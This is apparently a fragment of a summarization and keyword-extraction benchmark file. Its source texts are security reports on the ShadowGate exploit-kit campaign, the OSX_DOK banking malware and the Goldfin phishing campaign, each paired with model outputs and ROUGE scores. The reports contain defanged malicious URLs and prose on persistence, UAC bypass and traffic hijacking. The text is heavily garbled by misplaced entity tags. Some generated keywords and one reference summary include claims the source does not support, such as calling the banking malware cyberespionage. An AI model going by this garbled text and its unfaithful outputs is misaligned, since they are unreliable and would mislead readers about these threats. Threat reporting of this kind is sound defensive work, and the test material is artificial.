are protected by the following [WORK_OF_ART] Deep [WORK_OF_ART] Security rule:1009405 - Adobe Flash Player Use After Free Vulnerability ( CVE-2018 - 15982)Trend Micro \u2122 Of\ufb01ceScan \u2122 with XGen \u2122 endpoint security has [ORG] Vulnerability [ORG] Protection that shields endpoints from identi\ufb01ed and unknown vulnerability exploits even before patches are even deployed . [ORG] Trend [ORG] Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Suites and Worry - Free \u2122 [ORG] Business [ORG] Security protect end users and businesses from these threats by detecting and blocking malicious \ufb01les and all related malicious URLs . Additional insights from [PERSON] Chaoying [PERSON] Liu and [PERSON] Nakaya [PERSON] Yoshihiro This was also earlier reported by [GPE] Malwarebytes . Indicators of [ORG] CompromiseIndicator cdn - cloud[.]club Updated [DATE] July [DATE] 1 , 4:20PM : Updated to clarify the product of Revive [ORG] / OpenX that was compromised . Detection GreenFlash Sundown EK domain GreenFlash Sundown EK domain GreenFlash Sundown EK domain Coinminer . Win32.MALXMR.S MBM4 Coinminer . Win64.TOOLXMR . xeLearn how to protect Enterprises , [ORG] Small [ORG] Businesses , and [PERSON] Home [PERSON] Users from ransomware : ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bburl\ufb02ash - sundown - exploit - kit/5/7ShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit Kit - TrendLabs Security Intelligence Blog2/11/2020 Tags : exploit kit Security Predictions for 2020Cybersecurity in [DATE] 2020 will be viewed through many lenses \u2014 from differing attacker motivations and cybercriminal arsenal to technological developments and global threat intelligence \u2014 only so defenders can keep up with the broad range of threats . Read our security predictions for [CARDINAL] 2020.Business Process CompromiseAttackers are starting to invest in long - term operations that target speci\ufb01c processes enterprises rely on . They scout for vulnerable practices , susceptible systems and operational loopholes that they can leverage or abuse . To learn more , read our Security 101 : [ORG] Business [ORG] Process [ORG] Compromise . Recent PostsOutlaw Updates Kit to Kill Older Miner [PERSON] Versions , Targets More Systems Malicious [PERSON] Optimizer and Utility Android Apps on Google Play Communicate with [NORP] Trojans that [ORG] Install [ORG] Malware , [ORG] Perform [ORG] Mobile [ORG] Ad [ORG] Fraud [ORG] Security [ORG] Analysis [ORG] of [ORG] Devices That Support SCPI and [ORG] VISA [ORG] Protocols January Patch [DATE] Tuesday : Update List Includes Fixes for Internet Explorer , Remote Desktop , Cryptographic Bugs [ORG] First [ORG] Active [ORG] Attack [ORG] Exploiting CVE-2019 - 2215 Found on Google Play , Linked to SideWinder APT GroupPopular PostsSecurity Analysis of Devices That Support SCPI and [ORG] VISA [ORG] Protocols January Patch [DATE] Tuesday : Update List Includes Fixes for Internet Explorer , Remote Desktop , Cryptographic Bugs [ORG] First [ORG] Active [ORG] Attack [ORG] Exploiting CVE-2019 - 2215 Found on Google Play , Linked to [ORG] SideWinder [ORG] APT [ORG] Group Why Running a [ORG] Privileged [ORG] Container in [GPE] Docker Is a Bad Idea Looking into Attacks and Techniques Used Against WordPress SitesStay Updated Email Subscriptionurl\ufb02ash - sundown - exploit - kit/6/72/11/2020ShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit Kit - TrendLabs Security [PERSON] Intelligence [PERSON] BlogHome and [ORG] Home [ORG] Of\ufb01ce [ORG] About [ORG] Trend [ORG] Micro [ORG] Asia Paci\ufb01c Region ( [ORG] APAC ): [GPE] Australia / [GPE] New [GPE] Zealand , , [GPE] \u2f47 , \ub300\ud55c\ubbfc\uad6d ,   [LOC] Latin [LOC] America [LOC] Region ( LAR ): Brasil , [PERSON] M\u00e9xico [PERSON] North America Region ( [ORG] NABU ): [GPE] United [GPE] States , [LOC] Canada [LOC] Europe , [LOC] Middle [LOC] East , & Africa Region ( EMEA ): [GPE] France , [ORG] Deutschland [ORG] / [ORG] \u00d6sterreich [ORG] / [ORG] Schweiz , [GPE] Italia , \u0420\u043e\u0441\u0441\u0438\u044f , [GPE] Espa\u00f1a , [GPE] United [GPE] Kingdom / Ireland Copyright \u00a9 [DATE] 2020 Trend Micro Incorporated . All rights reserved.url\ufb02ash - sundown - exploit - kit/7/7", "generated_text": "the document; the ShadowGate; WordsJS; 2016; cryptocurrency miners; the exploit kit; ad servers; Revive/OpenX; malware; the kit; ad servers; South Korea; April 2018; visitors; malicious advertisements; the Greenflash Sundown exploit kit; the attackers; the Flash exploit; CVE-2018-4878; CVE-2018-15982; the campaign; the victim; the new version; protection; the infrastructure; the exploit code; ad servers; the campaign; ad servers; the attack; analysis; the campaign.", "ref_text": "<START-1>The report analyzes the resurgence of a cybercrime campaign called ShadowGate, which is using an upgraded version of its custom exploit kit, Greenflash Sundown, to infect victims worldwide with cryptocurrency mining malware. ShadowGate was active since 2015 but restricted operations after a takedown in 2016. It recently resumed attacks using compromised ad servers to redirect visitors to the Greenflash Sundown exploit kit. Greenflash Sundown has added encryption mechanisms and an evasion technique to collect victim system profiles before delivering payloads, allowing more targeted infections. It continues integrating new exploits like those for recent Flash vulnerabilities. The encryption uses public key cryptography but contains a flaw allowing offline decryption of payloads. The victim profiling helps avoid detection by security sandboxes. Attacks have expanded from primarily Asian targets to global victims across countries like the U.S. The exploit kit drops Monero cryptocurrency miners after infection. The report provides technical analysis of the new exploit kit capabilities and how its operators are refining techniques for evasion, targeting, and delivering payloads. It demonstrates ShadowGate's continued development of cybercrime tools and infrastructure despite previous disruptions. Recommendations include keeping software updated, using multilayered security, and deploying vulnerability shielding to mitigate such threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4823529411764706, "gpt3/lexical/rouge_rouge2": 0.14201183431952663, "gpt3/lexical/rouge_rougeL": 0.24705882352941178, "gpt3/lexical/rouge_rougeLsum": 0.24705882352941178, "gpt3_generated_text": ["The article discusses the return of the ShadowGate campaign, also known as WordsJS, which has recently started delivering cryptocurrency miners using an upgraded version of the Greenflash Sundown exploit kit. The campaign, which was first identified in 2015, initially delivered malware through compromised ad servers of Revive/OpenX advertising software. After a takedown operation in 2016, the campaign developed its own exploit kit called Greenflash Sundown. In 2018, the campaign integrated Flash exploits into the exploit kit, and in April 2018, it was found spreading cryptocurrency miners. After a period of relative inactivity, the campaign has recently been observed targeting global victims through ad servers. The article provides details on the evolving techniques and updates of the Greenflash Sundown exploit kit, including the use of encryption to protect malware payloads. The article also includes statistics on the campaign's activity and distribution."]}, {"split_name": "test", "sample_id": "test_74", "prompt_text": "Extract the keywords: [ORG] Trend [ORG] MicroAbout [ORG] TrendLabs [ORG] Security Intelligence BlogGo to \u2026 \u25bc [ORG] Home [ORG] \u00bb Malware \u00bb OSX [PERSON] Malware [PERSON] Linked to Operation Emmental Hijacks User Network TrafficOSX [PERSON] Malware [PERSON] Linked to Operation Emmental Hijacks User Network Traf\ufb01c Posted on : [DATE] July [DATE] 10 , [DATE] 2017 at 7:00 am1960Posted in : [PERSON] Malware Author : [PERSON] Rubio [PERSON] Wu ( Threats Analyst)The OSX_DOK malware ( Detected by [ORG] Trend [ORG] Micro as OSX_DOK . C ) showcases sophisticated features such as certificate abuse and security software evasion that affects machines using [ORG] Apple \u2019s OSX operating system . This malware , which specifically targets [NORP] Swiss banking users , uses a phishing campaign to drop its payload , which eventually results in the hijacking of a user \u2019s network traffic using a Man - in - the- Middle ( MitM ) attack . OSX_DOK.C seems to be another version of [ORG] WERDLOD ( Detected [ORG] by [ORG] Trend [ORG] Micro as TROJ_WERDLOD ) , which is a malware that was used during the Operation Emmental campaigns \u2014 an interesting development that we will tackle further in this blog post . Arrival Method and [ORG] Infection FlowFigure [CARDINAL] 1 : OSX_DOK.C infection routine for [DATE] Mac [DATE] systemsOSX_DOK.C [DATE] first arrives via a phishing email that contains certain files labeled as either .zip or .docx files . The sample we analyzed was a purported message from a police inspector in [GPE] Zurich allegedly claiming to unsuccessfully contact the recipient . The email also comes with [CARDINAL] two files attached claiming to contain questions for the user : [CARDINAL] one is a .zip file , which is a fake [PRODUCT] OSX app , while the other is a .docx file used to target Windows operating systems using [ORG] WERDLOD . Both of these samples work as Banking [NORP] Trojans and provide similar functionalities . Some examples of the files used in the email attachment include the following : [PERSON] Zahlungsinformationen 01.06.2017.zip Zahlungsinformationen digitec.zip zip Dokument 09.06.2017.zip Dokument 09.06.2017.docx 06.2017.docxOnce the docx file included in the phishing email is clicked , a warning window will pop up : Featured StoriesIIS 6.0 [WORK_OF_ART] Vulnerability [WORK_OF_ART] Leads [WORK_OF_ART] to [WORK_OF_ART] Code [WORK_OF_ART] ExecutionWinnti Abuses GitHub for [ORG] C&C [ORG] CommunicationsMajikPOS [ORG] Combines [ORG] PoS [ORG] Malware and RATs to [ORG] Pull [ORG] Off its Malicious [ORG] TricksNew Linux Malware Exploits CGI VulnerabilityCVE-2017 - 5638 : Apache Struts 2 Vulnerability Leads to Remote Code ExecutionBusiness Process CompromiseAttackers are starting to invest in long- term operations that target specific processes enterprises rely on . They scout for vulnerable practices , susceptible systems and operational loopholes that they can leverage or abuse . To learn more , read our Security 101 : [ORG] Business [ORG] Process [ORG] Compromise . Business Email [ORG] CompromiseHow can a sophisticated email scam cause [MONEY] more [MONEY] than $ 2.3 [MONEY] billion in damages to businesses around the world ? See the numbers behind [ORG] BECLatest [ORG] Ransomware PostsSLocker Mobile Ransomware Starts Mimicking WannaCryLarge - Scale Petya Ransomware Attack In [GPE] Progress , [LOC] Hits [LOC] Europe HardAdGholas Malvertising Campaign Employs Astrum Exploit [ORG] KitErebus [ORG] Resurfaces as [PERSON] Linux [PERSON] RansomwareAnalyzing the Fileless , Code - injecting SOREBRECT RansomwareRecent PostsOSX [PERSON] Malware [PERSON] Linked to Operation Emmental Hijacks User Network TrafficJuly \u2019s Android Security Bulletin Addresses Continuing Mediaserver and [PERSON] Qualcomm [PERSON] IssuesYour email hereSubscribeFigure [CARDINAL] 2 : Warning window on OSXThis infographic shows how ransomware has evolved , how big the problem has become , and ways to avoid being a ransomware victim . Check the infographicHere \u2019s our in - depth feature on # cryptocurrencies , the threats that abuse them & some countermeasures : \u2026 twitter.com/i/web/status/8 \u2026 [TIME] about [TIME] 12 [TIME] hours agoBithumb hack shows that [ORG] # cryptocurrency faces unique threats . Details and best practices : bit.ly/2tP69pU [TIME] about [TIME] 15 [TIME] hours agoAnalyzing the [NORP] Fileless , Code - injecting SOREBRECT RansomwareAnalyzing Xavier : [ORG] An Information - Stealing [ORG] Ad [ORG] Library on [ORG] AndroidMouse [ORG] Over , Macro : [PERSON] Spam [PERSON] Run in [LOC] Europe Uses Hover Action to Deliver Banking TrojanLarge - Scale Petya Ransomware Attack In [GPE] Progress , Hits Europe HardErebus Resurfaces as Linux RansomwareOur research with @polimi on [CARDINAL] # robot security will be presented at # [ORG] BHUSA : bit.ly/2p2Rndh # [ORG] ICSRansomware 101SLocker [GPE] Mobile Ransomware Starts Mimicking WannaCryInformation [PERSON] Stealer Found Hitting [NORP] Israeli HospitalsLarge - Scale Petya Ransomware Attack In [GPE] Progress , [LOC] Hits [LOC] Europe HardPopular [PRODUCT] PostsEmail [PRODUCT] Subscriptionabout [PRODUCT] 4 [PRODUCT] hours agoAfter this , [PERSON] the [PERSON] App [PERSON] Store on the system will be removed , followed by a full screen fake [ORG] OSX update screen . It will ask for a password to run command as root . Figure [CARDINAL] 3 : Fake [ORG] OSX update screenLatest TweetsFigure [CARDINAL] 4 : Fake OSX update screenThe malware will begin to download other utilities . It relies on [LOC] Homebrew , an open source software package manager to install [PERSON] Golang and Tor . Stay UpdatedThe malware will then install fake certificates in the system to perform a MitM attack without notifying the user . The structure of the fake [PRODUCT] App [PRODUCT] Store matches the application bundle structure and provides both [LANGUAGE] English and [NORP] German interfaces . The main executable is Dokument.app/Contents/MacOS/AppStore.The archive in [PERSON] Mac OSX looks like this : Figure [CARDINAL] 5 : Fake document fileMac [ORG] OSX will run the application if it passes certificates . In this case , the malware is signed off by a \u201c developer \u201d , which may actually be a dummy account or that of a compromised user . In addition , the time stamp on the CA is new , which might mean that it was obtained specifically for this attack . The fake certificate imitates the [ORG] COMODO root certificate . Take note that the fake certificate does not contain a [ORG] COMODO [ORG] Certificate [ORG] Authority seal that certifies its validity , as seen in the comparison below : Figure [CARDINAL] 6 : Comparison of a Fake [PERSON] COMODO ( left ) root certificate vs a genuine [ORG] COMODO certificate(right)We noticed that this malware will not work for [ORG] Mozilla [ORG] Firefox or [PERSON] Google [PERSON] Chrome since these [CARDINAL] two browsers have their own root certificates . Of all the major browsers , only [PERSON] Safari uses the system \u2019s certificates . We observed the attacker targeting both Windows and Mac OSX in the same spam mail on [DATE] June [DATE] 9 , [DATE] 2017 . There is a file shortcut embedded in the malicious .docx file \u2014 one that will download an executable file from Dropbox \u2014 that executes once clicked by the user . The functionalities are similar to the malicious app provided , which includes installing tor and proxy . We have already notified Dropbox about the use of its service for this malware . [ORG] Dropbox has already taken down the links . The malware will install [CARDINAL] two proxies running on local host port [DATE] 5555 and [DATE] 5588 . All of the traffic will be hijacked into the [ORDINAL] first proxy ( port [DATE] 5555 ) with the victim \u2019s external [ORG] IP address as parameter . Figure [CARDINAL] 7 : Installing proxies on local host port 5555The [ORDINAL] first ( port [DATE] 5555 ) proxy [ORDINAL] first finds the [ORG] IP parameter . If it is not in [GPE] Switzerland , the traffic will proceed as normal . If it detects an [ORG] IP located in [GPE] Switzerland , the malware will run an obfuscated JavaScript code and find its visiting domain . If the domain is in the target , the malware will perform a [ORG] MitM attack and redirect the traffic to the [ORDINAL] second proxy ( port [DATE] 5588 ) , which routes the traffic to the [ORG] Tor network . The purpose of these steps is to target users in [GPE] Switzerland and hijack their trafficAfter deobfuscating the malware , we found the target domains : Figure [CARDINAL] 8 : Hardcoded list of target banking websites in [ORG] SwitzerlandThe target domain \u2019s visitors will be redirected into an e - banking login page that looks and acts normally , but is located on dark web sites . However , once the victim enters an account and password . A window will pop out . Figure [CARDINAL] 9 : Hijacking connection to EKR bankThe pop - out window is just smoke and mirrors , where nothing actually happens once the countdown timer reaches [CARDINAL] zero . We analyzed the webpage and found attackers injecting a script into the webpage . Once the user enters an account and password , it will initiate [ORG] POST using [ORG] AJAX . The [ORG] POST message is sent to the same site as the fake login page \u2014 which an attacker can control inside the [ORG] Tor network . Figure [CARDINAL] 10 : Post message carrying argumentWe decoded the data section and found not only the account and password , but that it also fingerprinted the user \u2019s browser and system information . While [ORG] Operation [ORG] Emmental was able to bypass [CARDINAL] two - way authentication by tricking its victims into installing a fake app , we have not observed OSX_DOK.C doing this . However , since they can inject code into the webpage , it means they have the ability to do this as well . Performing static analysis on OSX_DOK.CWe performed static analysis on the sample and found it packed by [ORG] Ultimate [ORG] Packer for [PERSON] Executables ( UPX ) , an open source executable packer that can often be abused by malware . We successfully unpacked the initial sample we found dropped by the [ORG] UPX unpacker . The malware is not obfuscated so we easily found interesting strings here . We can see that the malware relies on bash shell for most of its setup . Figure [CARDINAL] 11 : OSX_DOK.C stringsWe were not able to unpack the sample discovered after [DATE] June [DATE] 9 , [DATE] 2017 . The [ORG] UPX gave a warning message about memory buffer overflow . The malware author seemingly made unpacking the malware more difficult to slow down or even evade the antivirus engine \u2019s scanning process . The packer is the same but the malware tries to exploit the undiscovered bug in the UPX library that causes unpack failure . We have reported the issues to the UPX team , and they have already fixed it . The impacted versions of the UPX library are [CARDINAL] 3.94 , [CARDINAL] 3.93 , and [CARDINAL] 3.92 . This technique enables the malware to efficiently run while evading unpacking techniques from the AntiVirus - integrated UPX library . Connecting OSX_DOK.C with WERDLODAs mentioned earlier , we believe that [FAC] OSX_DOK.C might be the [ORG] MAC [PRODUCT] OSX version of [ORG] WERDLOD , an online banking malware that used the same techniques as [ORG] Operation [ORG] Emmental . Other research have also connected the [ORG] OSX malware and [ORG] Retefe ( the external term used for [ORG] WERDLOD ) via similarities in their behavior . While [FAC] OSX_DOK.C is designed for [ORG] MAC [PRODUCT] OSX , which is a Unix - like system , [ORG] WERDLOD is designed for Windows . But in terms of features and behaviors , these [CARDINAL] two malware are very similar . Here is a list of their similarities . Both malware kill all current browsers before installing fake certificates : Both WERDLOD and [FAC] OSX_DOK.C are designed to kill the browser process before installing fake certificates . While WERDLOD kills processes for Internet Explorer , Firefox , and [PERSON] Chrome , [PERSON] OSX_DOK.C does the same on [PERSON] Safari , [PERSON] Firefox , and [ORG] Chrome . Both malware share the same proxy settings and script : While WERDLOD and [FAC] OSX_DOK.C use different codes ( since they target different operating systems ) , they have similar proxy settings and script formats . In particular , [ORG] WERDLOD uses scripts running on [GPE] Switzerland . Further analysis of both malware revealed that their main targets are very similar , as seen in the screenshot below . While it \u2019s possible that this is a coincidence , the rest of the evidence makes it unlikely for these [CARDINAL] two malware to target the same organizations by chance . Figure [CARDINAL] 14 : OSX_DOK.C target banksGiven the connection between [ORG] WERDLOD and [FAC] OSX_DOK.C , it is reasonable to assume that the latter is also a part of the Operational Emmental campaign . To further illustrate , here is a timeline of [ORG] Operation [ORG] Emmental and its potential relationship to OSX_DOK.C : Figure [CARDINAL] 15 : Connecting Operation Emmental with OSX_DOK.CMitigation and [ORG] Trend [ORG] Micro [ORG] SolutionsDespite phishing incidents for Mac devices being rarer than their Windows counterparts , users should still be aware that attackers can target them at any moment . By implementing best practices for phishing - type attacks \u2014 such as refraining from downloading files unless they are absolutely certain that they come from trustworthy sources \u2014 users can avoid being victimized by malware such as OSX_DOK.C that prey on users who lack awareness of phishing strategies . In addition , end users can also benefit from security solutions such as [ORG] Trend [ORG] Micro [ORG] Home [ORG] Security [ORG] for [ORG] Mac , which provides comprehensive security and multi - device protection against viruses , ransomware , malicious websites , and identity thieves . It also provides secure storage of passwords and other sensitive information . [ORG] Trend [ORG] Micro \u2122 [ORG] Mobile [ORG] Security for [ORG] Apple devices ( available on [PERSON] the [PERSON] App [PERSON] Store ) can monitor and block phishing attacks and other malicious URLs . For enterprises , [ORG] Trend [ORG] Micro \u2019s [ORG] Smart [ORG] Protection [ORG] Suites with XGen \u2122 security , which support Mac systems , infuse high - fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint . With additional analysis from Yi - Jhen [ORG] Hsieh ( DSNS lab , [ORG] National [ORG] Chiao [ORG] Tung [ORG] University)Related [ORG] Posts : A [WORK_OF_ART] Rising [WORK_OF_ART] Trend : [WORK_OF_ART] How [WORK_OF_ART] Attackers [WORK_OF_ART] are [WORK_OF_ART] Using [WORK_OF_ART] LNK [WORK_OF_ART] Files [WORK_OF_ART] to Download Malware DressCode Android Malware Finds Apparent Successor in [ORG] MilkyDoor [ORG] Picture [ORG] Perfect : [ORG] CryLocker Ransomware Uploads User Information as [ORG] PNG [ORG] Files [ORG] Network [ORG] Solutions to Ransomware \u2013 Stopping and Containing Its [ORG] SpreadLearn how to protect Enterprises , [ORG] Small [ORG] Businesses , and [PERSON] Home [PERSON] Users from ransomware : ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bbHOME AND [ORG] HOME [ORG] OFFICE [ORG] |FOR [ORG] BUSINESS |SECURITY [PERSON] INTELLIGENCE [PERSON] |ABOUT [PERSON] TREND MICROAsia Pacific Region ( [ORG] APAC ): [GPE] Australia / [GPE] New [GPE] Zealand , , [GPE] \u2f47 , \ub300\ud55c\ubbfc\uad6d ,   [LOC] Europe , [LOC] Middle [LOC] East , & Africa Region ( EMEA ): [GPE] France , [ORG] Deutschland [ORG] / [ORG] \u00d6sterreich [ORG] / [ORG] Schweiz , [GPE] Italia , \u0420\u043e\u0441\u0441\u0438\u044f , [GPE] Espa\u00f1a , [GPE] United [GPE] Kingdom / [LOC] IrelandLatin [LOC] America [LOC] Region ( LAR ): Brasil , [LOC] M\u00e9xicoNorth [LOC] America [LOC] Region ( [ORG] NABU ): [GPE] United [GPE] States , CanadaPrivacy StatementLegal PoliciesCopyright \u00a9 [CARDINAL] 2017 [ORG] Trend [ORG] Micro [ORG] Incorporated . All rights reserved .", "generated_text": "CA; OSX_DOK; Swiss banking; the malware; a phishing email; a DOCX file; questions; the user; the malware; WERDLOD; TROJ_WERDLOD; similar functionality; the file; Code; a DOCX file; Windows; Microsoft; the malware; Target; banking Trojans; malware processes; a phishing campaign; Bank Trojans; victims; the US; Europe; banking Trojans; the attackers; the malware; malware samples; Linux; services; Network traffic; the campaign; a response; the threat actor; detection.", "ref_text": "<START-1>Here is a summary of the key points from the PDF: The PDF describes analysis of a new macOS malware called OSX_DOK or OSX_DOK.C by security researchers at Trend Micro. This malware is linked to an ongoing cyberespionage campaign called Operation Emmental which has been active since at least 2014. OSX_DOK is distributed via phishing emails containing malicious .zip and .docx attachments. If opened, it initially shows a fake OSX software update screen to gain admin access. It then installs malicious certficates to perform man-in-the-middle attacks on the victim's internet traffic. The malware specifically targets banking and financial sites in Switzerland. It hijacks connections to these sites, redirecting users to fake login pages controlled by the attackers to steal account credentials and other sensitive data. Researchers discovered OSX_DOK is very similar in behavior to a Windows malware called WERDLOD or Retefe which was also used in Operation Emmental. Both kill browsers, install fake certificates, use tor/proxies, and share the same target list. This suggests OSX_DOK is the macOS version of the same cyberespionage toolkit. Operation Emmental has been active since at least 2014, targeting banks, governments, and corporations in various countries. The addition of macOS malware to their toolkit suggests the attackers are expanding their operations. Trend Micro recommends users be wary of unsolicited email attachments, use comprehensive security software, and enterprise solutions with cross-platform protection to detect threats like OSX_DOK that can steal sensitive data. In summary, the report provides analysis of a new macOS malware linked to an evolving, sophisticated cyberespionage campaign operation for nearly 3 years. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44174757281553395, "gpt3/lexical/rouge_rouge2": 0.0975609756097561, "gpt3/lexical/rouge_rougeL": 0.18446601941747573, "gpt3/lexical/rouge_rougeLsum": 0.18446601941747573, "gpt3_generated_text": ["The article discusses the OSX_DOK.C malware, which targets Swiss banking users through a sophisticated phishing campaign. The malware arrives via a phishing email containing fake.zip or .docx files, with the .docx file triggering a warning window upon clicking. This malware is linked to Operation Emmental and is a version of TROJ_WERDLOD, targeting both Mac and Windows operating systems. The malware hijacks a user's network traffic using a Man-in-the-Middle (MitM) attack. This article provides insight into the arrival method, infection flow, and similar functionality to WERDLOD. It also highlights the sophisticated features of the malware, such as certificate abuse and security software evasion. The article emphasizes the need for robust security measures to detect and respond to such threats, as the attackers are investing in long-term operations targeting specific processes and services."]}, {"split_name": "test", "sample_id": "test_75", "prompt_text": "Extract the keywords: A Persistent Campaign Targeting CIS Countries [DATE] July [DATE] 26 , 2018Copyright \u00a9 2018 Accenture Security . All rights reserved.1SUMMARY A number of security vendors reported a series of cyber - attacks involving the use of a malware family called [ORG] SOCKSBOT and claimed to be associated with CANDLEFISH ( [GPE] a.k.a . Patchwork , Dropping Elephant ) . However , as disclosed in this report , research by [ORG] iDefense analysts shows that [ORG] SOCKSBOT was in fact used by a threat group in [DATE] an [DATE] 18- month - long campaign dubbed Goldfin , spoofing financial institutions in [ORG] the [ORG] Commonwealth [ORG] of [ORG] Independent [ORG] States ( CIS ) countries since [DATE] as [DATE] early [DATE] as [DATE] February [DATE] 2017 to as recently as [DATE] May [DATE] 2018 . Based on the tactics , techniques and procedures ( TTPs ) observed in this campaign , [ORG] iDefense assesses with moderate confidence that the reported campaign is unlikely to be associated with CANDLEFISH.In addition , [ORG] iDefense analysts have identified infrastructure overlap and the shared use of a [ORG] PowerShell obfuscation technique with FIN7 . Although these observations are not enough to attribute the Goldfin campaign to FIN7 , [ORG] iDefense assesses these to be interesting and noteworthy observations that further highlights the complex relationships that exist behind - the - scene in organized cyber crime . HOW TO USE THIS REPORTINTENDED AUDIENCEiDefense is providing information about the reported campaigns to the general [ORG] iDefense customer base , with this report being intended for security operations center ( SOC ) analysts and engineers . Management and executive leadership may also want to use this information . HOW TO USE THIS [ORG] INTELLIGENCEiDefense is providing this information so that customers are aware of the modus operandi of a highly active threat group that is targeting financial institutions for financial gain . SOC analysts and engineers can use this [ORG] IA 's detailed information pertaining to the workings of a malware family and indicators of compromise ( IoCs ) to contain or mitigate the discussed threat through monitoring or blocking . SOC analysts can use the information provided in the [PRODUCT] Analysis and Mitigation sections of this [GPE] IA for hunting activities for systems that may have already been compromised . Analysts and security engineers can use the IoCs by adding them to hunting lists on endpoint detection and response ( [ORG] EDR ) solutions as well as network- and host - based blacklists to detect and deny malware implantation and command - and - control ( C2 ) communication . Intelligence analysts may want to use the information provided in this [GPE] IA to better inform their own analyses . The provided information can also help inform ongoing intelligenceCopyright \u00a9 2018 Accenture Security . All rights reserved.2analyses and forensic investigations , particularly for compromise discovery , damage assessment , and attribution . Management and executive leadership may use this information to assess the risks associated with the threat described herein to make operational and policy decisions accordingly . HOW THIS INTELLIGENCE HELPS ADDRESS EXISTING OR POTENTIAL THREATSKnowledge of the group 's tactics , techniques , and procedures ( TTPs ) should help to better inform detection and response to attacks by this threat group . CAMPAIGN ANALYSISiDefense analysts came across [CARDINAL] two spear - phishing campaigns in [DATE] October [DATE] 2017 involving the use of a malware family publicly known as [ORG] SOCKSBOT . [CARDINAL] One campaign spoofs [ORG] the [ORG] Halyk [ORG] Bank ( [ORG] Exhibit [ORG] 1 ) and another spoofs the [ORG] PrivatBank ( Exhibit 2):Exhibit 1 : Spear - Phishing Email Spoofing Halyk BankCopyright \u00a9 2018 Accenture Security . All rights reserved.3Exhibit [CARDINAL] 2 : Content of a Spear - Phishing E - mail [ORG] Spoofing [ORG] PrivatBank [ORG] Shared [ORG] on [ORG] the [ORG] Public [ORG] Forum [ORG] doneckforum.comAs [ORG] Exhibits 1 and [CARDINAL] 2 show , both emails contain an identical message , even down to the location of the embedded hyperlinks . The only differences are the embedded URLs and the signature of the email in order to reflect the financial institution the attackers were spoofing . This information suggests some sort of phishing kit was likely used to generate the phishing emails . An approximate translation of the e - mail spoofing [ORG] Halyk [ORG] Bank is as follows : Subject : Notification of opening an account ( [ORG] Halyk [ORG] Bank of Kazakhs Dear customer , an account with [ORG] the People 's [ORG] Bank [ORG] of [ORG] Kazakhstan has been opened in your name , you can find detailed information in the If you did not receive an envelope with a login and password , then you need to register to access [LOC] the [LOC] Personal [LOC] Area . In case of loss of login / password , you can register a new one in the section \" Pa If in the process of work you have any questions or problems , plea se contact [ORG] the [ORG] Customer [ORG] Service [ORG] Department at the contacts listed below . Our specialists are always ready to help you . The embedded malicious hyperlinks used in the respective attacks are as follows : hxxp://halyk - bank[.]com / dog.zip hxxp://privatbank - ua[.]com / dog.zipSubsequent technical analysis of the infection chain involved led [ORG] iDefense to uncover an [DATE] 18 - month long campaign of spoofing banks in [ORG] CIS countries , with the most recent campaign observed on [DATE] May 28 , [DATE] 2018 spoofing [ORG] the [ORG] Idea [ORG] Bank CJSC : Copyright \u00a9 2018 Accenture Security . All rights reserved.4Exhibit [CARDINAL] 3 : Spear - Phishing Email Spoofing Idea Bank CJSCThe forum member reports that [CARDINAL] two spear - phishing emails were received : [CARDINAL] one claiming to be a notification about opening an account and the other claiming to be a notification of a loan being taken out . The content of the latter email is approximately translated below : Dear client , in your name , a loan was issued to [ORG] Idea [ORG] Bank , for mor e details , see the attached file in which the full name and phone number of your personal loan expert is indicated , the amount and c onditions for repaying the loan . An envelope with a credit agreement was sent to your address . In c ase you did not receive the envelope , you should contact your pers In case of loss of the contract , you can restore it at the nearest branch of the bank or request a duplicate through your personal ex For any questions you are interested in , you can contact your pers onal expert or [ORG] the [ORG] Customer [ORG] Service [ORG] Department at the contacts lis ted below . Our specialists are always ready to help you . Idea Bank CJSC Phone for calls from abroad : +375 ( [CARDINAL] 17 ) [CARDINAL] 306 - 33 - 14In the attacks observed , all involved a phishing email with [CARDINAL] two embedded URLs directing the user to download a file named dog.zip . Based on the content of the e - mails and the domain names , the following banks were spoofed in [ORG] this [ORG] campaign:\u2022 [ORG] Halyk [ORG] Bank ( [GPE] Kazakhstan ) \u2022 [ORG] PrivatBank ( [GPE] Ukraine ) Idea Bank ( Belarus ) \u2022Copyright \u00a9 2018 Accenture Security . All rights reserved.5\u2022 [ORG] Tejara [ORG] Bank ( Iran)It is also noteworthy that in both phishing kits , there are always [CARDINAL] two hyperlinks linking to the same malicious file : [CARDINAL] one in the body of the message and one at the end of the e - mail in a link called [PERSON] \u0414\u043e\u0433\u043e\u0432\u043e\u0440 ( which translates to Contract).The next section details the infection chain that follows the initial download . INFECTION CHAIN ANALYSIS code is in fact hidden as comments and is dynamically deobfuscated once the script has been executed . Copyright \u00a9 2018 Accenture Security . All rights reserved.6Exhibit [CARDINAL] 5 : Obfuscated Code in dog.jsOnce deobfuscated ( see Exhibit 6 ) , it is clear that the code is designed to do [CARDINAL] two things:1 . To look for a running anti - virus processes , such as avp.exe ( Kaspersky Antivirus).Note that some variants of the malware also search for ekrn.exe ( ESET ) , cis.exe ( [PERSON] Comodo ) and avgnt.exe ( [ORG] Avira).2 . To drop and execute a [ORG] PowerShell script named setup.ps1 . This script isgenerated based on [PERSON] Base64 encoded data stored in variables in the malware ) . The content of this script is stored in a variable named data and is [GPE] Based64 [GPE] encoded2 . Create a cmdlet that would : a. move the script checkupdate.ps1 to the home directory for the currentPowerShell installb . establish persistence by creating a Windows service named Check forupdates , set to \" delay - auto \" start and execute checkupdate.ps13 . Use a modified version of the function [ORG] Invoke - EventVwrBypass from the [ORG] EmpirePost - exploitation framework to bypass [ORG] UAC and execute the above cmdletExhibit [CARDINAL] 7 : Deobfuscated Code in setup.ps1Copyright \u00a9 2018 Accenture Security . All rights reserved.8STAGE 3 - POWERSHELL REFLECTIVE LOADERSimilarly , checkupdate.ps1 used in each attack has the respective MD5 compressed , [PERSON] Base64 encoded , and embedded within the script , which is similar to a technique used in [ORG] PowerSploit . However , the observed technique appears to be a variant of [ORG] PowerSploit as the encoded payload is further split into a number of chunks that are dynamically loaded into an array variable named $ [MONEY] OArr as shown in [DATE] Exhibit 8 : 